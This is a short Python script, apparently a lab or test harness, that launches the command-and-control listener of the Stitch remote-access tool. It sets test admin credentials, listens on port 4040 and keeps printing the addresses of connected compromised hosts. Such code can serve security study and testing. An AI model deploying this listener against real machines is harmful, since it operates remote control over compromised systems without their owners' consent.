
import sys
import os
sys.path.insert(0, '/workspace')
os.environ['STITCH_ADMIN_USER'] = 'testadmin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'testpassword123'

from Application.stitch_cmd import stitch_server
import time

print("[C2] Starting Stitch server...")
server = stitch_server()
server.do_listen('4040')
print("[C2] Server listening on port 4040")

# Monitor loop
    # TODO: Review - infinite loop may need exit condition
while True:
    time.sleep(5)
    if server.inf_sock:
        for ip, sock in server.inf_sock.items():
            print(f"[C2] Active connection: {ip}")
    else:
        print("[C2] No active connections")
